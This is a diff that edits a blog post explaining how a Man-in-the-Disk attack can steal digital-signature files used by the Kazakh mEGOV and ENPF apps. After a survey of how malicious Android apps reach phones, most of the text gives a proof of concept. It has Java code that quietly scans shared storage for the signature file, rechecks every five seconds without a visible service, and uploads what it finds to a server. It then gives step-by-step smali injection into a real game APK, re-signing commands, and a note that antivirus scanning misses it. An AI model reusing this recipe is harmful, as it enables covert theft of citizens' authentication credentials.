@@ -1,6 +1,6 @@
 ---
 layout: post
-title: How to steal digital signature using Man-In-The-Disk
+title: How to steal a digital signature with a Man-in-the-Disk attack
 tags: [android, malware]
 category: [en]
 ---
@@ -9,19 +9,19 @@ category: [en]
 
 ## Intro
 
-There is a website in Kazakhstan that provides public services to the citizens, such as registration at the place of residence, issuance of passports, marriage and so on. There is also a mobile applications for this. These mobile applications [mEGOV](https://play.google.com/store/apps/details?id=kz.nitec.egov.mgov) and [ENPF](https://play.google.com/store/apps/details?id=kz.enpf.mobile) use digital signatures as one of the methods for authentication. To log in you need to transfer the digital signature file to the phone. This method is vulnerable to a Man-In-The-Disk attack. To become a victim of an attack, you just need to install any of your favorite application which was secretly modified by an attacker. I will demonstrate how this can be done. First of all, let’s find out how such applications can be installed.
+Kazakhstan provides many public services online, including residence registration, passport applications, and marriage registration. Mobile applications such as [mEGOV](https://play.google.com/store/apps/details?id=kz.nitec.egov.mgov) and [ENPF](https://play.google.com/store/apps/details?id=kz.enpf.mobile) use digital signatures as one form of authentication. To sign in, users copy their digital-signature file to the phone. This workflow is vulnerable to a Man-in-the-Disk attack: an attacker can modify an otherwise familiar application and use it to steal the file. I will demonstrate how this can happen, beginning with the ways modified applications reach users.
 
-## How malicious applications get on the phone
+## How malicious applications get onto phones
 
-### Local application markets of China, Iran, etc.
+### Local application markets in China, Iran, and elsewhere
 
 Examples: cafebazaar.ir, android.myapp.com, apkplz.net
 
-Such websites exist due to censorship and blocking of Google services and/or blocking of official application servers. Usually they contain local analogues of popular applications and their modifications. These modifications ([like this Iranian telegram](https://apkplz.net/app/org.ir.talaeii)) usually attract users with new features that are not in official applications. 
+These markets often exist because Google services or official application servers are blocked. They distribute local alternatives to popular applications as well as modified versions. Such modifications, including [this Iranian Telegram client](https://apkplz.net/app/org.ir.talaeii), attract users by offering features absent from official releases.
 
-What is the danger of such applications? 
+Why are these applications dangerous?
 
-You never know what they actually do. In addition, some governments do not miss the opportunity and publish their modifications with functionality for tracking the users. Applications with government surveillance are malicious by definition. One day I studied a malicious application ([Virustotal result](https://www.virustotal.com/gui/file/1e6a821f5de824b91c6676742a521a8dcdd345f25a820befa11e5975fc8c39d3/community), [sample](/assets/files/iranian_apk_infected.zip) (password: infected)) which scanned the phone for telegram clones:
+Users cannot easily determine what these unofficial builds actually do. Some governments have also distributed modified applications with user-surveillance features. I analyzed one malicious application ([VirusTotal results](https://www.virustotal.com/gui/file/1e6a821f5de824b91c6676742a521a8dcdd345f25a820befa11e5975fc8c39d3/community), [sample](/assets/files/iranian_apk_infected.zip), password: `infected`) that scanned the device for Telegram clones:
 
 ```
 "com.hanista.mobogram"
@@ -36,25 +36,25 @@ You never know what they actually do. In addition, some governments do not miss 
 "com.mehrdad.blacktelegram"
 ```
 
-This list indicates the real relevance and popularity of modified apps. Researching this malware has led me to an [article](https://cybershafarat.com/2016/01/20/farsitelegram/) that talks about a telegram clone distributed through the *Cafebazaar market* by the Iranian government. Quote from there:
+The list shows how widespread modified clients had become. While researching the malware, I found an [article](https://cybershafarat.com/2016/01/20/farsitelegram/) about a Telegram clone reportedly distributed through the *Cafe Bazaar* market by the Iranian government:
 
 > This looks to be developed to the specifications of the Iranian government enabling them to track every bit and byte put forward by users of the app.
 
-How many telegram clones do you see? ([Source](https://apkplz.net/))
+How many Telegram clones can you spot? ([Source](https://apkplz.net/))
 
 ![image](/assets/images/iran_telegrams.png)
 
-It is almost impossible for ordinary users to protect themselves from this since there is no other choice — official markets are being intensely blocked and goverment apps are being promoted. Researchers and antivirus companies from around the world report to Google all found infected applications. They are removed from the Play Market which obviously does not apply to third-party application markets. Also Google’s policy regarding the admission of hosted applications does not apply to them.
+Ordinary users have few ways to protect themselves when official stores are blocked and government-backed alternatives are promoted. Security researchers and antivirus vendors report malicious applications to Google, which can remove them from Google Play. Those reports and Google's review policies do not protect users of independent third-party markets.
 
-Some of the markets are very popular such as the *Tencent My App* with 260 million users per month ([source](https://www.appinchina.co/market/app-stores/)):
+Some of these markets are enormous. *Tencent My App*, for example, reportedly had 260 million monthly users ([source](https://www.appinchina.co/market/app-stores/)):
 
 ![image](/assets/images/china_app_stores.png)
 
-Local applications used within the same region/country often use the same SDK (set of libraries) for advertising tracking, social integration, etc. If the same library is used in several applications then with high probability some of these applications can be installed by one user. These libraries can use the capabilities of different applications in which they are built-in to steal user data bypassing the granted permissions. For example, one application has access to receive IMEI but does not have access to the Internet. The built-in library knows about it and therefore reads the IMEI and saves it on the SD card in a hidden folder. The same library is built into another application that has Internet access but does not have access to IMEI then reads IMEI from a hidden folder and sends it to developer server. This method [was used](https://www.ftc.gov/system/files/documents/public_events/1415032/privacycon2019_serge_egelman.pdf) by two Chinese companies Baidu and Salmonads.
+Applications popular within the same region often share SDKs for advertising, analytics, and social integration. When several applications on one device include the same SDK, the library can combine their permissions to bypass Android's security model. For example, an application allowed to read the IMEI but denied network access can store the identifier in a hidden directory on external storage. A second application with network access can read that file and send the identifier to the SDK operator. Research found this behavior in SDKs associated with Baidu and Salmonads ([source](https://www.ftc.gov/system/files/documents/public_events/1415032/privacycon2019_serge_egelman.pdf)).
 
 ### Phishing
 
-Classical phishing is the main tool of international criminal groups and [special services](https://www.theverge.com/2018/1/18/16905464/spyware-lebanon-government-research-dark-caracal-gdgs) of different countries. As often happens, functionality for tracking users is added to a regular messenger application and then massively distributed with a message - "Look, what a cool application for communication". Delivery to users can be carried out through social networks, Whatsapp/Telegram spam, built-in ads on sites, etc.
+Conventional phishing remains a major distribution method for criminal groups and state [intelligence services](https://www.theverge.com/2018/1/18/16905464/spyware-lebanon-government-research-dark-caracal-gdgs). Attackers add surveillance features to a legitimate-looking messenger and distribute it with messages such as, "Look at this great new chat app." Delivery channels include social networks, WhatsApp or Telegram spam, and website advertising.
 
 ![](/assets/images/dark_caracal_phishing.png)
 
@@ -76,33 +76,33 @@ Popup window:
 
 Examples: @apkdl_bot, t.me/fun_android
 
-There are telegram bots for downloading apk files. They are able to inject malicious code into applications on the fly while you downloading them. It works like this — you request the bot to download "Instagram", the script on the other side downloads it from Google Play, unpacks, adds malicious code, packs it back and returns it to you.
+Some Telegram bots provide APK downloads and can modify applications on demand. A user requests Instagram, for example, and the server downloads it from Google Play, unpacks it, inserts additional code, repackages it, and returns the modified APK.
 
-### Third party markets
+### Third-party markets
 
 Examples: apkpure.com, apkmirror.com, apps.evozi.com/apk-downloader/
 
-There are a huge number of unofficial sites for downloading android applications. Some of them provide the ability to upload your application which may be malicious. [Upload example](https://www.apkmirror.com/#uploadAPK):
+Many unofficial sites distribute Android applications, and some allow anyone to upload an APK, including a malicious one. [Upload example](https://www.apkmirror.com/#uploadAPK):
 
 ![img](/assets/images/apkmirror_submit.png)
 
-Example of a malware that has spread this way:
+An example of malware distributed this way:
 
 ![img](/assets/images/how_ghost_push_work.jpg)
 
 [source](https://www.cmcm.com/blog/en/security/2015-09-18/799.html)
 
-Approximate statistics for unofficial sources can be found in the [Android Security Report 2018](https://source.android.com/security/reports/Google_Android_Security_2018_Report_Final.pdf) — 1.6 billion apps blocked by Google Play Protect. There were much more installations. Some people even write [articles](https://www.makeuseof.com/tag/using-android-without-google/) about how good it is to use third-party markets. A huge number of other sites distribute applications without ads, hacked paid applications for free, applications with additional functionality:
+The [Android Security & Privacy 2018 Year in Review](https://source.android.com/security/reports/Google_Android_Security_2018_Report_Final.pdf) offers some indication of the scale: Google Play Protect blocked 1.6 billion attempts to install potentially harmful applications from outside Google Play. Third-party markets are nevertheless promoted in [articles](https://www.makeuseof.com/tag/using-android-without-google/), and many sites offer ad-free modifications, pirated paid applications, and builds with additional features:
 
 ![](/assets/images/mx_player_patched.png)
 
 ![](/assets/images/ccleaner_cracked.png)
 
-### Google play
+### Google Play
 
-Google play has protection called Google Play Protect, which uses machine learning to determine if the application is malicious. It is not able to understand exactly which application is malicious and which is not, since this requires a full manual check. What is the difference between a spy app that monitors all your movements and a fitness app? Researchers [constantly](https://news.drweb.ru/show/?i=13349&lng=ru) [find](https://www.zdnet.com/article/android-security-flashlight-apps-on-google-play-infested-with-adware-were-downloaded-by-1-5m-people/) [hundreds](https://www.zdnet.com/article/google-malware-in-google-play-doubled-in-2018-because-of-click-fraud-apps/) of [infected](https://www.express.co.uk/life-style/science-technology/1143651/Android-warning-malware-Google-Play-Store-security-June-23) [applications](https://www.vice.com/en_us/article/43z93g/hackers-hid-android-malware-in-google-play-store-exodus-esurv) published on Google Play.
+Google Play Protect uses machine learning and other signals to detect malicious applications, but automated systems cannot perfectly distinguish abuse from legitimate behavior. A fitness application and spyware, for example, may request similar location data for very different purposes. Researchers [regularly](https://news.drweb.ru/show/?i=13349&lng=ru) [find](https://www.zdnet.com/article/android-security-flashlight-apps-on-google-play-infested-with-adware-were-downloaded-by-1-5m-people/) [large](https://www.zdnet.com/article/google-malware-in-google-play-doubled-in-2018-because-of-click-fraud-apps/) [malware](https://www.express.co.uk/life-style/science-technology/1143651/Android-warning-malware-Google-Play-Store-security-June-23) [campaigns](https://www.vice.com/en_us/article/43z93g/hackers-hid-android-malware-in-google-play-store-exodus-esurv) on Google Play.
 
-Typically, a malicious application pretends to be a *google play service* and [uses a similar icon](https://www.zdnet.com/article/this-trojan-masquerades-as-google-play-to-hide-on-your-phone) to mislead users. Why Google Play does not check the icon for similarity with its official applications is good question. When I used telegram, I put an avatar with a paper airplane (like on official account) and they blocked me immediately. Another method used by malicious applications is to replace the letters ("L" with "I", "g" with "q") to create a name similar to the official application:
+Malicious applications often impersonate *Google Play services* and [use a similar icon](https://www.zdnet.com/article/this-trojan-masquerades-as-google-play-to-hide-on-your-phone) to mislead users. It is reasonable to ask why Google Play does not flag icons that closely resemble official products. Telegram once blocked my account immediately after I used a paper-airplane avatar similar to its official icon. Attackers also substitute visually similar letters, such as `l` and `I` or `g` and `q`, to imitate legitimate application names:
 
 ![image](/assets/images/spoil_name.png) 
 
@@ -114,61 +114,61 @@ Typically, a malicious application pretends to be a *google play service* and [u
 
 2. [When crossing the country border](https://www.theguardian.com/world/2019/jul/02/chinese-border-guards-surveillance-app-tourists-phones)
 
-3. Connecting to an unfamiliar computer via USB, with debugging enabled on the phone
+3. Connecting a phone with USB debugging enabled to an untrusted computer
 
-4. An attacker gaining access to your Google account, and installing the application on your phone through Google Play
+4. An attacker compromising a Google account and remotely installing an application through Google Play
 
 5. [Preinstalled applications](https://thehackernews.com/2016/11/hacking-android-smartphone.html)
 
-6. [By court order/without order. By the police/special services](https://security.stackexchange.com/questions/194353/police-forcing-me-to-install-jingwang-spyware-app-how-to-minimize-impact)
+6. [With or without a court order, by police or intelligence services](https://security.stackexchange.com/questions/194353/police-forcing-me-to-install-jingwang-spyware-app-how-to-minimize-impact)
 
 7. [Watering hole attack](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/137/watering-hole-101?ClickID=cqlns7xfva7wwxx4iiw4qfvpxkllkiqwpkz)
 
-8. You visited a friend but his TV [infected your phone](http://www.aftvnews.com/android-malware-worm-that-mines-cryptocurrency-is-infecting-amazon-fire-tv-and-fire-tv-stick-devices/)
+8. Malware spreading from another Android device on the same network, such as an [infected Fire TV](http://www.aftvnews.com/android-malware-worm-that-mines-cryptocurrency-is-infecting-amazon-fire-tv-and-fire-tv-stick-devices/)
 
 > The particular version appearing on Fire TV devices installs itself as an app called "Test" with the package name "com.google.time.timer". Once it infects an Android device, it begins to use the device’s resources to mine cryptocurrencies and attempts to spread itself to other Android devices on the same network.
 
-## How attackers infect android applications
+## How attackers infect Android applications
 
-Now we understand how a malicious application can get on your phone. Next, it will be demonstrated how an attacker can modify any android application. Our malicious code scans the phone’s memory, searches for a file with digital signature and sends it to the server.
+Now that we have seen how a malicious application can reach a phone, I will demonstrate how an attacker can modify an Android application. The proof-of-concept code scans external storage for a digital-signature file and sends it to a server.
 
-### What is Man-In-The-Disk?
+### What is Man-in-the-Disk?
 
-The attack vector is got attention after [this article](https://blog.checkpoint.com/2018/08/12/man-in-the-disk-a-new-attack-surface-for-android-apps/). I advise you to read it first. Who did not read, I will tell the story in brief. 
+The attack vector gained attention after Check Point published [Man-in-the-Disk: A New Attack Surface for Android Apps](https://blog.checkpoint.com/2018/08/12/man-in-the-disk-a-new-attack-surface-for-android-apps/). I recommend reading it; the brief explanation below covers the concepts needed for this article.
 
-In android, the memory for applications is divided into Internal Storage and External Storage. Internal storage is the internal memory of the application, accessible only to it and to no one else. Every application on the phone corresponds to an unique linux user and an unique folder with permissions only for this user. This is a great defense mechanism. External storage — the main memory of the phone, accessible to all applications (this also includes the SD card). Why is it needed? For example you use photo editor application. After editing, you want to save the photo so that it is accessible from the gallery. If you put it in internal storage, then it will not be available to anyone except your application. Also browsers download all files to the Downloads shared folder.
+Android applications use two broad storage areas: internal and external storage. Internal storage is private to an application. Each installed application runs under a unique Linux user and receives a directory whose permissions restrict access to that user. External storage, including shared device storage and SD cards, is designed for files that other applications may need to access. A photo editor, for example, saves an image to shared storage so that the gallery can display it, while browsers save downloads to a shared `Downloads` directory.
 
-Each android application has its own set of permissions that it requests. Among them there are those that people willingly close their eyes to and do not take seriously. I talk about READ_EXTERNAL_STORAGE permission. It allows the application to access the main memory of the phone, and therefore to all data of other applications. Nobody would be surprised if the application "notepad" asks for this permission. It may be necessary for it to store settings and cache there. Manipulating the data of other applications in external storage is the core concept of Man-In-The-Disk attack. Another default permission is INTERNET. As the name implies, it allows the application to have access to the network. It is sad that the user is not shown a special window asking him to give this permission. You just add it to your application and android give it to you.
+Every Android application requests its own set of permissions, some of which users may underestimate. On the Android versions discussed here, `READ_EXTERNAL_STORAGE` gives an application broad access to shared storage and therefore to files written there by other applications. Users may not question a note-taking application requesting this permission because it could plausibly store attachments or backups. Reading or modifying another application's files on external storage is the core of a Man-in-the-Disk attack. The `INTERNET` permission allows network access and is granted at installation without a separate runtime prompt.
 
-I downloaded the top 15 Kazakhstan applications and wrote a [script](https://github.com/thatskriptkid/OrderOfSixAngles/blob/master/PermParser.py) that displays statistics on requested permissions. As you can see, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE and INTERNET are very popular. This means that attackers can less painfully inject malicious code that steals digital signatures in most applications.
+I downloaded 15 popular applications in Kazakhstan and wrote a [script](https://github.com/thatskriptkid/OrderOfSixAngles/blob/master/PermParser.py) to summarize their requested permissions. `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE`, and `INTERNET` were common, allowing injected code to blend into the host application's existing permission set.
 
 ![top-15-apps](/assets/images/permissions.png)
 
-Whatsapp stores SSLSessionCache (File-based cache of established SSL sessions) in external storage.
+WhatsApp stored its `SSLSessionCache`, a file-based cache of established TLS sessions, on external storage.
 
 ![](/assets/images/whatsapp_ssl.png)
 
-Telegram and Instagram store cached images in shared memory. Almost all the photos you view, and those that you send to each other, are available to any application on your phone:
+Telegram and Instagram stored cached images on shared storage. This made many viewed and exchanged photos accessible to other applications with storage permission:
 
 ![](/assets/images/telegram_external.png)
 
-Our Kazakhstan mEGOV and UNPF applications require that the digital signature is in External Storage:
+The Kazakhstani mEGOV and ENPF applications required the digital-signature file to be stored on external storage:
 
 ![](/assets/images/egov.png)
 
 ![](/assets/images/enpf.png)
 
-Google is aware of the problem and is going to change READ_EXTERNAL_STORAGE permission in Android Q.
+Google addressed this class of problem through the scoped-storage changes introduced with Android Q.
 
 > In order to access any other file that another app has created, including files in a "downloads" directory, your app must use the Storage Access Framework, which allows the user to select a specific file. 
 
 ## Creating payload
 
-Let’s move on to the main scanner functionality. It will consist of three main classes: ```StageAttack```, ```MaliciousService```, ```MaliciousTaskManager```.
+The scanner consists of three main classes: `StageAttack`, `MaliciousService`, and `MaliciousTaskManager`.
 
 ![](/assets/images/sign_scan/prj_struct.png)
 
-```StageAttack``` - consists of one static method that starts our attack. Static property will help us to easily inject itself to the target class.
+`StageAttack` exposes a single static method that starts the proof of concept. Making the method static simplifies the call inserted into the target class.
 
 
 ```java
@@ -181,7 +181,7 @@ public class StageAttack {
 }
 ```
 
-```MaliciousService``` - is a service that recursively searches all external storage.
+`MaliciousService` recursively searches external storage.
 
 ```java
 private String pwn2(File dir) {
@@ -207,7 +207,7 @@ return null;
 }
 ```
 
-If the digital signature is not found, we will repeat the search every 5 seconds until we find it. You can use any interval. If we taking too small an interval, our service runs the risk of being stopped by the system. The higher the version of android, the more severe the policy regarding the operation of background processes. We also cannot use Foreground service, because it is constantly visible to everyone. Not being an android developer, I spent a lot of time to find a way to schedule a task that will be completed on the exact time. It is not as simple as it seems. There are several recommended methods in Android (JobService, WorkManager, setRepeating()). The documentation does not explicitly indicate that the interval of the task should be at least 15 minutes and its execution time depends on the desire of the system. This does not suit us, so we use the ```AlarmManager``` class with the ```setExactAndAllowWhileIdle()``` method. When the task is completed, we schedule it again, with the same interval. This is the only method currently known to me that has the highest accuracy.
+If the signature file is not found, the PoC repeats the search every five seconds. A very short interval increases the chance that Android will stop the service, especially on newer versions with stricter background-execution limits. A foreground service would be more reliable but would remain visible to the user. Android's recommended scheduling APIs, including `JobService`, `WorkManager`, and `setRepeating()`, do not guarantee exact execution times and may impose minimum intervals. The PoC therefore uses `AlarmManager.setExactAndAllowWhileIdle()` and schedules a new alarm after each run. At the time of testing, this provided the most precise scheduling behavior.
 
 ```java
 private void scheduleMalService() {
@@ -224,7 +224,7 @@ private void scheduleMalService() {
 }
 ```
 
-If a digital signature is found, we send the file to the server:
+When the signature file is found, the PoC sends it to a server:
 
 ```java
 private void sendToServer(String path) {
@@ -249,14 +249,14 @@ private void sendToServer(String path) {
 
 ## Injecting payload
 
-First, we decompile target application (the application that we want to infect) using [apktool](https://ibotpeaches.github.io/Apktool/). We do not decompile the application to java code, because after the modification, we will not be able to assemble it back. We need to get smali classes. And we will also inject our code in the form of smali code.
+First, decode the target application with [apktool](https://ibotpeaches.github.io/Apktool/). Decompiling it to Java would not produce source that could be rebuilt reliably, so we work with smali and inject the payload in the same form.
 
 <details>
 <summary>What is smali code?</summary>
-Android applications are compiled into bytecode, which is executed by the android ART or Dalvik virtual machine. The bytecode itself is hard to read, so its human-readable form is called smali. smali is an analogue of assembly language, but for android.
+Android applications are compiled to DEX bytecode, which is executed by ART or the older Dalvik virtual machine. Smali is a human-readable assembly syntax for that bytecode.
 </details>
 
-If we want our payload to be executed at application start up, we must modify the entry point. The entry point to any GUI application is an ```Activity``` child class that receives ```ACTION_MAIN```. Open the folder with the decompiled application, and search for entry point in the AndroidManifest.xml file:
+To execute the payload at startup, we must modify the application's launcher activity. Search the decoded `AndroidManifest.xml` for the activity whose intent filter includes `ACTION_MAIN` and `CATEGORY_LAUNCHER`:
 
 ```xml
 <activity android:name="com.halfbrick.mortar.MortarGameLauncherActivity">
@@ -267,13 +267,13 @@ If we want our payload to be executed at application start up, we must modify th
 </activity>
 ```
 
-We found the ```com.halfbrick.mortar.MortarGameLauncherActivity``` class we needed. Before you study it, let’s look at the life cycle of Activity
+This identifies `com.halfbrick.mortar.MortarGameLauncherActivity`. Before inspecting it, review the Android activity lifecycle:
 
 ![activity life cycle](/assets/images/activity_lifecycle.png)
 
 [source](https://developer.android.com/reference/android/app/Activity)
 
-Open Activity, for me it lies along the path ```base\smali_classes2\com\halfbrick\mortar\MortarGameLauncherActivity.smali```. If you have not seen smali code before, this is not scary, it is simple enough to read and logically clear:
+Open the activity's smali file. In this APK, it is located at `base\smali_classes2\com\halfbrick\mortar\MortarGameLauncherActivity.smali`. Even without prior smali experience, the code is reasonably easy to follow:
 
 ```java
 .class public Lcom/halfbrick/mortar/MortarGameLauncherActivity;
@@ -362,7 +362,7 @@ return-void
 .end method
 ```
 
-We found out that ```MortarGameLauncherActivity``` launches ```MortarGameActivity``` and closes. Let's edit ```MortarGameActivity```. We are interested in what happens in the ```Oncreate()``` method, since it starts the creation of activity. Immediately after that call we insert our code.
+`MortarGameLauncherActivity` starts `MortarGameActivity` and then closes. We therefore edit `MortarGameActivity`, inserting the call immediately after its superclass `onCreate()` returns.
 
 ```java
 .method protected onCreate(Landroid/os/Bundle;)V
@@ -391,7 +391,7 @@ invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameActivity;->getIntent()Landr
 ...
 ```
 
-Now we need smali code of our payload. We need to build apk and decompile it. Then we move our three decompiled classes (path - ```smali\ kz\c\signscan```) to the folder ```com/halfbrick/mortar```. Change the package name of all classes, from ```kz.c.signscan``` to ```com.halfbrick.mortar```.
+Next, build an APK containing the payload and decode it to obtain the corresponding smali. Move the three decoded classes from `smali\kz\c\signscan` to `com\halfbrick\mortar`, then change their package from `kz.c.signscan` to `com.halfbrick.mortar`.
 
 Before:
 
@@ -405,13 +405,13 @@ After:
 .class public Lcom/halfbrick/mortar/StageAttack;
 ```
 
-From the smali class ```MainActivity``` take the payload’s call line:
+Copy the payload invocation from the `MainActivity` smali class:
 
 ```java
 invoke-static {p0}, Lcom/halfbrick/mortar/StageAttack;->pwn(Landroid/content/Context;)V
 ```
 
-And insert into ```MortarGameActivity```. As a result, the ```onCreate()``` method looks like:
+Insert it into `MortarGameActivity`. The resulting `onCreate()` method is:
 
 ```java
 ...
@@ -442,7 +442,7 @@ invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameActivity;->getIntent()Landr
 ...
 ```
 
-The ```MaliciousTaskManager``` class in payload is a BroadcastReceiver. ```MaliciousService``` is an IntentService so we need to add them to the manifest:
+The payload's `MaliciousTaskManager` is a `BroadcastReceiver`, while `MaliciousService` is an `IntentService`. Both components must be declared in the manifest:
 
 ```xml
 ...
@@ -451,7 +451,7 @@ The ```MaliciousTaskManager``` class in payload is a BroadcastReceiver. ```Malic
 ...
 ```
 
-Pack everything back with the apktool and sign it. Virustotal will not show anything, since we are doing nothing “illegal”. We just use the available permissions of our application.
+Rebuild the APK with apktool and sign it. At the time of testing, VirusTotal did not detect the modified application because the payload reused permissions already granted to the host and relied on ordinary Android APIs.
 
 ![](/assets/images/ninja_fruit_virustotal.png)
 
@@ -465,7 +465,7 @@ keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg R
 jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name
 ```
 
-Video demonstartion:
+Video demonstrations:
 
 https://youtu.be/e5w5taMY8MA
 
